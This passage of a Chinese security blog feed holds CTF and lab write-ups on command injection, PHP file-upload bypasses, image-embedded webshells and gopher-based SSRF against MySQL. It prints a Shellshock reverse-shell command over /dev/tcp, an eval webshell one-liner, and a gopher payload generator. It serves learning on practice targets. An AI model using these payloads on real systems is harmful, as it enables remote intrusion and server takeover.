sizeof(rnd)) == 0) &#123;</span><br><span class="line">        int fd = open(argv[1], O_RDONLY);</span><br><span class="line">        if(fd &gt; 0) &#123;</span><br><span class="line">            int s = read(fd, buff, 1024);</span><br><span class="line">            if(s &gt; 0) &#123;</span><br><span class="line">                write(1, buff, s);</span><br><span class="line">            &#125;</span><br><span class="line">            close(fd);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            write(1, &quot;Can not open file\n&quot;, 18);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        write(1, &quot;Wrong response\n&quot;, 16);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致1秒之内把他输出的再输入回去，就可以打出文件内容<br>此时我们的思路很简单，运行这个c<br>算了，直接拿shell好了<br>shell反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/你的ip/8888 0&gt;&amp;1&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p><p>选择了linux下的重定向，我们将输出写到某个文件中，再自动输入即可，这样即可达到目的<br>我们先去探索可写目录，容易发现/var/tmp具有写权限<br>直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/skyflag &lt; /var/tmp/skyflag</span><br></pre></td></tr></table></figure></p><p>然后cat /var/tmp/skyflag就可以得到flag了</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><blockquote><p><a href="http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</a></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/#wordpress-1" target="_blank" rel="noopener">https://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/#wordpress-1</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      关于hackme web wp
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="sql注入" scheme="https://museljh.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="ssrf" scheme="https://museljh.github.io/tags/ssrf/"/>
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
      <category term="代码审计" scheme="https://museljh.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs-writeup 11 ~ 15</title>
    <link href="https://museljh.github.io/2019/02/13/upload-labs-writeup%2011~15/"/>
    <id>https://museljh.github.io/2019/02/13/upload-labs-writeup 11~15/</id>
    <published>2019-02-13T03:15:54.000Z</published>
    <updated>2019-02-13T03:32:24.002Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>upload-labs是一个基于php语言的上传漏洞的靶场项目包括(最新commit17ec936) 的19个上传关卡的方法。可以通过git clone <a href="https://github.com/c0ny1/upload-labs.git" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs.git</a> 来搭建属于自己的一个upload练习靶场</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><img src="https://i.imgur.com/hiUxIwF.png" alt=""></p><h3 id="Pass-011-00截断-GET"><a href="#Pass-011-00截断-GET" class="headerlink" title="Pass-011 %00截断 GET"></a>Pass-011 %00截断 GET</h3><p>直接看源码<br><img src="https://i.imgur.com/j3nJ4hh.png" alt=""><br>这题明显是白名单，与之前黑名单不同只能允许jpg，png，gif的文件<br>感觉可以使用00截断</p><blockquote><p>strrpos — 计算指定字符串在目标字符串中最后一次出现的位置</p></blockquote><blockquote><p>strrpos ( string $haystack , string $needle [, int $offset = 0 ] ) : int</p></blockquote><p><img src="https://i.imgur.com/MmjmIIz.png" alt=""></p><p>这段大概意思是截取文件后缀的意思<br>CVE-2015-2348<br>影响版本：5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7<br>exp：move_uploaded_file($_FILES[‘name’][‘tmp_name’],”/file.php\x00.jpg”);<br><img src="https://i.imgur.com/acnnxVI.png" alt=""><br><img src="https://i.imgur.com/XEsYSR3.png" alt=""><br>这里的image_path是可以控制的<br>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。<br>但是有环境限制：</p><blockquote><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题<br>magic_quotes_gpc需要为OFF状态</p></blockquote><p><img src="https://i.imgur.com/SIB1B90.png" alt=""><br>结果<br><img src="https://i.imgur.com/2wU5AFl.png" alt=""><br>故我们就可以这样做<br>好吧，大概环境不行  因为这里要满足is_path 估计这样搞就不是path了吧，</p><h3 id="Pass-012-00截断-POST"><a href="#Pass-012-00截断-POST" class="headerlink" title="Pass-012 %00截断 POST"></a>Pass-012 %00截断 POST</h3><p>直接看源码<br><img src="https://i.imgur.com/sC8UfVD.png" alt=""><br>依旧是使用白名单，和之前不同在于<br><img src="https://i.imgur.com/lnBgbIr.png" alt=""><br>save_path由get改成了post<br>依旧是%00截断，但是有一个区别在于post不会自动将其url解码<br>所以我们要先将%00进行url解码后才行（就是个空格吧？）<br><img src="https://i.imgur.com/VVVqh3g.png" alt=""><br>反正我是不可以的。</p><h3 id="Pass-013-图片马"><a href="#Pass-013-图片马" class="headerlink" title="Pass-013 图片马"></a>Pass-013 图片马</h3><p>源码<br><img src="https://i.imgur.com/xmvYDpi.png" alt=""><br>一眼看上去，这题的画风和之前有很大不同阿</p><blockquote><p>unpack - 从二进制字符串中解压缩数据<br>unpack （ string $format ， string $data [， int $offset= 0 ]）： array</p></blockquote><blockquote><p>intval — 获取变量的整数值<br>intval ( mixed $var [, int $base = 10 ] ) : int</p></blockquote><p>大概意思就是取文件末尾的后缀的二进制数<br>然后unpack进行二进制解包变成char，<br>后将其转化为int 与jap、png、gif的int数会不会相等，相等就上传成功，之前的00截断是肯定用不上的，要怎么做呢？<br>图片马，没错，我也是刚刚知道有这么回事，居然有这么骚的操作。<br>具体可以看</p><blockquote><p><a href="http://gv7.me/articles/2017/picture-trojan-horse-making-method/" target="_blank" rel="noopener">http://gv7.me/articles/2017/picture-trojan-horse-making-method/</a></p></blockquote><p>准备一张正常图片（a.jpg）,新建一个文件内容写入以下代码（b.php）</p><blockquote><p>&lt;?php @eval($_POST[‘cmd’]);?&gt;</p></blockquote><p>使用以下命令生成图片木马muma.jpg</p><blockquote><p>   copy  a.jpg /b + b.php /a = muma.jpg</p></blockquote><blockquote><p>参数/b指定以二进制格式复制、合并文件(图片),参数/a指定以ASCII格式复制、合并文件（php文件），x.php文件里为要写的一句话木马</p></blockquote><p>然而</p><p><img src="https://i.imgur.com/c0nkpZb.png" alt=""></p><p>换种方法<br>使用二进制编辑工具（比如winhex,utrl editor等等）直接写恶意代码到文件尾部。<br>这里我使用winhex给大家演示<br><img src="https://i.imgur.com/8nn3B4q.png" alt=""><br>访问后<br><img src="https://i.imgur.com/1bjaxFc.png" alt=""><br>没反应？？？<br>难道是我打开的姿势不对<br>我要换个姿势打开<br><img src="https://i.imgur.com/Cf3BuYH.png" alt=""><br>卧槽这么神奇，<br>马萨卡？之前的也可以用这么搞吗，换成12关试试<br><img src="https://i.imgur.com/KWqDaSJ.png" alt=""><br>还是上传成功了，图片🐎恐怖如斯<br><img src="https://i.imgur.com/V6Hvf47.png" alt=""><br>还有谁，还有什么可以阻止图片🐎的吗<br>不过，这个图片🐎应该还是要结合文件包含漏洞的，<br>试试看，菜刀能不能连上这个图片🐎<br><img src="https://i.imgur.com/rh9zcwU.png" alt=""><br>貌似不可以<br>额，原来我漏了一段url，图片🐎是可以作为webshell的<br>（啧啧，斗🐎强者恐怖如斯）<br>不过我们也可以利用图片马加上代码执行，可以生成一个webshell</p><blockquote><p>如：echo“&lt;?php @eval($_POST[‘caidao’]);?&gt;” &gt; x.php</p></blockquote><p>具体可以看</p><blockquote><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/80044676#%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC" target="_blank" rel="noopener">https://blog.csdn.net/Breeze_CAT/article/details/80044676#%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC</a></p></blockquote><p>顺便了解下jpg/png/gif的头部格式<br>每种类型的图片内容最开头会有一个标志性的头部，这个头部被称为文件幻数。<br>jpg<br><img src="https://i.imgur.com/9cRo2o7.png" alt=""><br>文件头值为FFD8FFE000104A464946<br>png<br><img src="https://i.imgur.com/2QkAD0w.png" alt=""><br>网上传是89504E47（然而貌似不是）会使getimagesize函数和exif_imagetype函数报错（虽然我感觉是这个）<br>但是别的大神实测是89504E470D0A1A0A<br>gif 是 文件头值为474946383961</p><h3 id="Pass-014-图片马"><a href="#Pass-014-图片马" class="headerlink" title="Pass-014 图片马"></a>Pass-014 图片马</h3><p>即使没有看源码图片🐎依旧上传成功，不过我们还是看下源码看一下有没有其他的利用方式<br><img src="https://i.imgur.com/20jZLJY.png" alt=""></p><blockquote><p>image_type_to_extension — 取得图像类型的文件后缀<br>image_type_to_extension ( int $imagetype [, bool $include_dot = TRUE ] ) : string</p></blockquote><blockquote><p>getimagesize — 取得图像大小<br>getimagesize ( string $filename [, array &amp;$imageinfo ] ) : array</p></blockquote><p>感觉这种写法就是上面那题的变种写法<br>getimagesize函数只是对文件头部进行检测，只要文件头部正确就可以了<br>但是图片内容最好要符合php规则，不然会导致报错而无法执行我们想要的代码</p><h3 id="Pass-015-图片马"><a href="#Pass-015-图片马" class="headerlink" title="Pass-015 图片马"></a>Pass-015 图片马</h3><p>继续上传图片🐎<br><img src="https://i.imgur.com/mxurp6J.png" alt=""><br>what？咋没了<br>看下源码<br><img src="https://i.imgur.com/Va5qtza.png" alt=""><br>貌似是一个php_exif没有开<br>我就不开了<br><img src="https://i.imgur.com/JDSwfKY.png" alt=""><br>打开应该就可以了，额，我就不演示了，<br>exif_imagetype和getimagesize都是对文件头部进行检测，所以，<br>冲啊，图片🐎</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="http://lawlietweb.com/2018/06/07/upload-labs/#%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3" target="_blank" rel="noopener">http://lawlietweb.com/2018/06/07/upload-labs/#%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      关于upload-labs Pass 11 ~ 15的writeup
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="文件上传" scheme="https://museljh.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>对于利用gopher进行ssrf的学习与理解</title>
    <link href="https://museljh.github.io/2019/02/12/%E5%AF%B9%E4%BA%8E%E5%88%A9%E7%94%A8gopher%E8%BF%9B%E8%A1%8Cssrf%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
    <id>https://museljh.github.io/2019/02/12/对于利用gopher进行ssrf的学习与理解/</id>
    <published>2019-02-12T11:58:42.000Z</published>
    <updated>2019-02-12T12:08:39.926Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前学习了下35C3CTF POST 题目以及之前的比赛经历深刻认识到自己对于ssrf理解的浅薄，在此特地google一波，并且来自我总结下，本文主要内容是对于其他文章的理解</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h3><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><h3 id="利用Gopher实现ssrf"><a href="#利用Gopher实现ssrf" class="headerlink" title="利用Gopher实现ssrf"></a>利用Gopher实现ssrf</h3><blockquote><p><a href="https://paper.seebug.org/510/" target="_blank" rel="noopener">https://paper.seebug.org/510/</a></p></blockquote><blockquote><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。但是经过部分测试，发现阿里云的 libcurl 还是支持 Gopher 协议的，在实际环境中可能会有更多。</p></blockquote><h4 id="利用SSRF漏洞结合Gopher系统攻击内网未授权MySQL，并且获取系统shell的方法"><a href="#利用SSRF漏洞结合Gopher系统攻击内网未授权MySQL，并且获取系统shell的方法" class="headerlink" title="利用SSRF漏洞结合Gopher系统攻击内网未授权MySQL，并且获取系统shell的方法"></a>利用SSRF漏洞结合Gopher系统攻击内网未授权MySQL，并且获取系统shell的方法</h4><h4 id="一、MySQL通信协议"><a href="#一、MySQL通信协议" class="headerlink" title="一、MySQL通信协议"></a>一、MySQL通信协议</h4><p>在进行利用SSRF攻击MySQL之前，先了解一下MySQL的通信协议。MySQL分为服务端和客户端，客户端连接服务器使存在三种方法</p><blockquote><p>1.Unix套接字；<br>2.内存共享/命名管道；<br>3.TCP/IP套接字；</p></blockquote><p>Linux/unix当客户端和mysql服务器处于同一台电脑时就是使用unix套接字</p><p>windows下当客户端和mysql服务器处于同一台电脑时就是使用内存共享/命名管道</p><p>1.当什么参数都没有指定的时候，mysql默认使用socket（内存共享/命名管道与unix套接字）方式登陆，即我们常用的mysql–uroot –proot登录MySQL服务器</p><blockquote><p>如果my.cnf的[客户端]没有指定socket文件路径时，mysql默认会去寻找/tmp/mysql.sock，所以如果mysql服务启动的时候，生成的socket文件不是默认路径的话，登陆会报错</p></blockquote><p>2.TCP/IP套接字是在任何系统下都可以使用的方式，mysql登陆的时候，指定参数-h，会使用tcp/ip的方式连接，如果没有指定端口的话，默认是使用3306端口，即mysql–h127.0.0.1 –uroot –proot时就是要TCP/IP套接字<br>3.当mysql登陆时，同时指定-h和-S，mysql会默认使用tcp/ip的方式连接。</p><h4 id="二、MySQL认证过程："><a href="#二、MySQL认证过程：" class="headerlink" title="二、MySQL认证过程："></a>二、MySQL认证过程：</h4><p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。</p><blockquote><p>MySQL 交互模式和非交互模式</p></blockquote><blockquote><p>交互式操作：在本机上打开mysql的客户端，就是那个黑窗口，在黑窗口下进行各种sql操作，当然走的肯定是tcp协议。</p></blockquote><blockquote><p>非交互式操作：在你的项目中进行程序调用。比如一边是tomcat web服务器，一边是数据库服务器，两者怎么通信？在java web里，我们通常会选择hibernate或者是jdbc来连接。那么这时候就是非交互式操作。</p></blockquote><p>所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的</p><p>MySQL客户端与服务器的交互主要分为两个阶段：Connection Phase（连接阶段或者叫认证阶段）和Command Phase（命令阶段）。在连接阶段包括握手包和认证包.<br>认证数据包格式如下：<br><img src="https://i.imgur.com/iCyYZQs.jpg" alt=""><br>这里以无需密码认证情况登录，看看认证数据包内容：<br><img src="https://i.imgur.com/YHd940u.jpg" alt=""><br>这里Packet Length为整个数据包的长度，Packet Number为sequence_id随每个数据包递增，从0开始，命令执行阶段遇到命令重新重置为0。这两个Packet为真个MySQL通协议的基础数据包。</p><p>客户端请求命令数据包格式如下：<br><img src="https://i.imgur.com/dPFWsJp.jpg" alt=""></p><h4 id="三、构造攻击数据包"><a href="#三、构造攻击数据包" class="headerlink" title="三、构造攻击数据包"></a>三、构造攻击数据包</h4><p>环境：Ubuntu 18.04.1 LTS<br>    mmysql Ver 14.14 Distrib 5.7.25<br>root登入数据库 mysql -u root -p xxx<br>创建新的用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create user &apos;ljh&apos;@&apos;localhost&apos;;</span><br><span class="line">GRANT USAGE ON *.* TO &apos;ljh&apos;@&apos;localhost&apos;;</span><br><span class="line">GRANT ALL ON *.* TO &apos;ljh&apos;@&apos;localhost&apos;;</span><br></pre></td></tr></table></figure></p><p>第一步 开一个窗口抓包（记得要用root权限）：</p><blockquote><p>tcpdump -i lo port 3306 -w mysql.pcay</p></blockquote><p>第二步开一个窗口使用TCP/IP模式连接MySQL服务器：</p><blockquote><p>mysql -h127.0.0.1 -u ljh</p></blockquote><p>为了抓到更多数据，然后随便select一个内容，在exit退出。</p><p>第三步使用Wireshark打开上面抓到的mysql.pcap包：</p><p><img src="https://i.imgur.com/WQ2HYkN.png" alt=""></p><p>记得将数据包内容变成一行（去掉空格和换行符）</p><p>创建一个python脚本内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line"></span><br><span class="line">def result(s):</span><br><span class="line">a=[s[i:i+2] for i in xrange(0,len(s),2)]</span><br><span class="line">return &quot;curl gopher://127.0.0.1:3306/_%&quot; + &quot;%&quot;.join(a)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">import sys</span><br><span class="line">s=sys.argv[1]</span><br><span class="line">print result(s)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/tqvO1DV.png" alt=""><br>然而<br><img src="https://i.imgur.com/c6VZ8Sd.png" alt=""><br>？？？ 啥叫断开的管道<br>原来如此</p><blockquote><p>然后在另一个窗口，开启MySQL终端，查询一些信息。最后记得exit;，不然会出问题。</p></blockquote><p>重新来一次<br>。。还是不行<br><img src="https://i.imgur.com/LG3ZqCG.png" alt=""><br>原来如此，。。我居然直接用wireshark进行抓包。。<br>然而再次尝试<br><img src="https://i.imgur.com/JCnP014.png" alt=""><br>mmp，气死偶啦<br>原因未知，重启一下看看<br><img src="https://i.imgur.com/tnRnL1p.png" alt=""><br>额貌似可以了（原因可能是因为它sock管道可能被占用了？）</p><p>然而这有啥用呢？？？？<br>我们可以通过<br>select xxx into outfile yyy<br>创造一个shell文件也可以反弹shell<br>（注意：在导出文件时，当前mysql用户必须存在file权限；部分MySQL服务器运行时启用了–secure-file-priv选项，导出文件时只能导出到规定的目录下，一般为/var/mysql/data命令，要自定义目录时必须修改配置文件设置secure-file-priv = “”；并且导入目录需要有写权限。）</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>gopher进行ssrf应该是可以结合命令执行来读取数据库中的flag文件</p><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>嗯，可以看,这边最后讲了一题很不错，不过貌似没有源码。只能看看了</p><blockquote><p><a href="http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6</a></p></blockquote><p>大致内容是<br>此时通过file协议可以读出文件的源码。</p><blockquote><p>file://localhost/../../../var/www/html/index.php<br>file://localhost/../../../var/www/html/config.php</p></blockquote><p>在自己本地测试，则创建一个库名字叫做ssrf，以及一个ssrf_user无密码的用户。</p><blockquote><p>mysql -h 127.0.0.1 -u ssrf_user -e “use ssrf; select secret from flag”<br>并在另一个窗口抓包，然后把原始数据导出为urlencode格式即可</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://paper.seebug.org/510/" target="_blank" rel="noopener">https://paper.seebug.org/510/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      对于利用gopher进行ssrf的学习与理解，并用一个小实验来深入了解。
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="ssrf" scheme="https://museljh.github.io/tags/ssrf/"/>
    
      <category term="gopher" scheme="https://museljh.github.io/tags/gopher/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs-writeup 6~10</title>
    <link href="https://museljh.github.io/2019/02/12/upload-labs-writeup%206~10/"/>
    <id>https://museljh.github.io/2019/02/12/upload-labs-writeup 6~10/</id>
    <published>2019-02-12T02:51:22.000Z</published>
    <updated>2019-02-12T02:55:01.812Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>upload-labs是一个基于php语言的上传漏洞的靶场项目包括(最新commit17ec936) 的19个上传关卡的方法。可以通过git clone <a href="https://github.com/c0ny1/upload-labs.git" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs.git</a> 来搭建属于自己的一个upload练习靶场</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><img src="https://i.imgur.com/hiUxIwF.png" alt=""></p><h3 id="Pass-06-未过滤空格"><a href="#Pass-06-未过滤空格" class="headerlink" title="Pass-06 未过滤空格"></a>Pass-06 未过滤空格</h3><p>可以看出这关和第五关很相似<br>查看下源码（在subline看会更清楚些）<br><img src="https://i.imgur.com/MZofMpQ.png" alt=""><br>发现它大小写过滤了，但是没有过滤空格这样我们就可以构造.php空格绕过过滤<br>因为在windows下它会自动去除文件后面的空格<br><img src="https://i.imgur.com/ktpRa1s.png" alt=""><br>在Linux貌似不行，没有试过</p><h3 id="Pass-07-未去掉点和空格"><a href="#Pass-07-未去掉点和空格" class="headerlink" title="Pass-07 未去掉点和空格~~~~"></a>Pass-07 未去掉点和空格~~~~</h3><p>查看下源码<br><img src="https://i.imgur.com/yRvKrBM.png" alt=""><br>这次它过滤了首尾的空格，且去除了最后的点我感觉是要构造和之前的那样.php.空格.的形式这样的话最后会变成.php.在windows下还是会被apache执行成php文件<br>试试<br><img src="https://i.imgur.com/VxqYqY9.png" alt=""><br>上传成功<br>后来发现貌似并没有去掉后面的. 看来php. .这样的形式因为在windows下 所以 先将最后的.去掉后来又去掉了.空格<br>尝试下只构造php.<br><img src="https://i.imgur.com/Guh1LQf.png" alt=""><br>同样也上传成功</p><h3 id="Pass-08-这题与之前不同没有过滤-DATA"><a href="#Pass-08-这题与之前不同没有过滤-DATA" class="headerlink" title="Pass-08  这题与之前不同没有过滤::$DATA"></a>Pass-08  这题与之前不同没有过滤::$DATA</h3><p>查看源码<br><img src="https://i.imgur.com/uWyl8je.png" alt=""><br>方法一：.php. . .<br>这题首先过滤了首尾的空格<br>然后去掉了末尾的.<br>并且区分大小写，<br>最后又去掉首尾空格<br>这说明之前的.php.空格不行<br>但是.php. .应该还是可以的<br>试试<br><img src="https://i.imgur.com/Ewah53l.png" alt=""></p><p>貌似不可以，？？第七题为啥可以？？？<br>分析一波，第七题最后会变成.php. .<br>而这题去掉了点与末尾的空格变成了.php.按道理这个是可以的<br>那我们变成.php. . .这样呢？‘<br>试试<br><img src="https://i.imgur.com/IOAokOc.png" alt=""><br>上传成功<br>为啥.php.就不可以呢？？原因未知（或许与apache的某种解析机制有关？毕竟windows下直接.php.会直接变成php文件），按道理是可以的<br>方法二：<br>这题与之前不同没有过滤::$DATA<br>具体看</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/52099683" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/52099683</a></p></blockquote><p>特性一：主要利用了如下的特性</p><blockquote><p>双引号(“&gt;”) &lt; == &gt; 点号(“.”)’;<br>大于符号(“&gt;”) &lt; == &gt; 问号(“?”)’;<br>小于符号(“&lt;”) &lt; == &gt; 星号(“*”)’;</p></blockquote><p>我们先构造一个.php：进行截断这样会产生一种没有内容的php文件<br><img src="https://i.imgur.com/cJRfWm9.png" alt=""><br>直接用冒号貌似是不可以的，所以后面加个jpg<br><img src="https://i.imgur.com/ORnLS9c.png" alt=""><br>上传成功<br>但是这种文件是没有大小的<br><img src="https://i.imgur.com/XK8XD3X.png" alt=""><br>我们再上传个201902111119393767.&lt;&lt;&lt;<br>进行覆盖这个php文件，这里要事先知道这个上传文件的文件名才可以<br>额，<br><img src="https://i.imgur.com/Uc7SWHW.png" alt=""><br>好像这样是不可以的…<br>原因未知，大概是修复了这个问题吧，那这只能给大家增加下知识了</p><p>特性二：</p><blockquote><p>The default data stream has no name. That is, the fully qualified name for the default stream for a file called “sample.txt” is “sample.txt::$DATA” since “sample.txt” is the name of the file and “$DATA” is the stream type.</p></blockquote><p>我的理解是 windows下的流数据是没有文件名的<br>::$DATA，当时如果它是这样的sample.txt::$DATA，那么sample.txt就是它的文件名<br>利用这个特性构造如下</p><p><img src="https://i.imgur.com/Jd49vDS.png" alt=""><br>成功上传</p><h3 id="Pass-09-php-绕过"><a href="#Pass-09-php-绕过" class="headerlink" title="Pass-09  php. . .绕过"></a>Pass-09  php. . .绕过</h3><p>看下源码<br><img src="https://i.imgur.com/h8AuZPN.png" alt=""><br>方法一：<br>大概看了下，增加了对::$DATA的过滤，<br>不过我们还是可以采取.php. . .这样的形式进行绕过<br>看看还有没有其他方法<br>方法二：<br>看了下别人的wp，发现文件上传的文件名是截取/后的<br>比如说上传个aa/.jpg 最后上传会变成.jpg<br>好吧，想了想好像这个貌似没有啥用阿…</p><h3 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10  双写绕过"></a>Pass-10  双写绕过</h3><p>查看源码<br><img src="https://i.imgur.com/QnTkJ4T.png" alt=""><br>这题明显黑名单数量要少很多<br>嗯，意思是前面题有过滤的这题都可以绕过？<br>方法一<br>貌似没有过滤大小写？<br>尝试下大写.PHP<br><img src="https://i.imgur.com/LA6V48T.png" alt=""><br>结果上传了个这个..<br>说明.PHP被 str_ireplace($deny_ext,””, $file_name);这个函数代替了变成空格了<br>那我们.php.php试试<br>还是这样<br><img src="https://i.imgur.com/bGXuLoD.png" alt=""><br>那.php.php.php呢？？？？<br>还是失败，<br>看来查查php手册</p><blockquote><p>str_ireplace — str_replace() 的忽略大小写版本</p></blockquote><p>这个函数是忽略大小写的，并且是从头到尾都删除，但是只删除一次<br>那么我们就可以双写绕过构造.phphpp</p><p><img src="https://i.imgur.com/oSJlOFL.png" alt=""><br>最后变成<br><img src="https://i.imgur.com/emBgTYe.png" alt=""><br>？？？.hpp是什么鬼<br>应为我们是php+hpp 它应该是先匹配第一个<br>那么我们构造.pphphp试试<br><img src="https://i.imgur.com/c1CXbm0.png" alt=""><br>上传成功</p>]]></content>
    
    <summary type="html">
    
      关于upload-labs Pass 06 ~ 10的writeup
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="文件上传" scheme="https://museljh.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>35C3CTF POST WP 的学习</title>
    <link href="https://museljh.github.io/2019/02/11/35C3CTF%20POST%20WP%20%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>https://museljh.github.io/2019/02/11/35C3CTF POST WP 的学习/</id>
    <published>2019-02-11T15:36:08.000Z</published>
    <updated>2019-02-11T16:22:06.163Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这场比赛我是没打的，是在看先知社区的时候看到这题的wp，看了下，感觉好难阿..本来不打算写的，但是想想这题还是有很多知识点可以吸收的就自己试试看。<br>基本是参考</p><blockquote><p><a href="https://www.smi1e.top/35c3ctf-post-wp/" target="_blank" rel="noopener">https://www.smi1e.top/35c3ctf-post-wp/</a></p></blockquote><p>自己再进行补充一些<br>官方Dockerfile+wp地址：<a href="https://github.com/eboda/35c3/tree/master/post" target="_blank" rel="noopener">https://github.com/eboda/35c3/tree/master/post</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>它有三个提示</p><blockquote><p>Hint: flag is in db<br>Hint2: the lovely XSS is part of the beautiful design and insignificant for the challenge<br>Hint3: You probably want to get the source code, luckily for you it’s rather hard to configure nginx correctly.</p></blockquote><h3 id="第一步-nginx配置错误"><a href="#第一步-nginx配置错误" class="headerlink" title="第一步 nginx配置错误"></a>第一步 nginx配置错误</h3><p>hint3 说明nginx配置有问题<br>推荐看这篇</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p></blockquote><p>目录穿越漏洞<br>原文是这样</p><blockquote><p>假设静态文件存储在/home/目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名<br>location /files 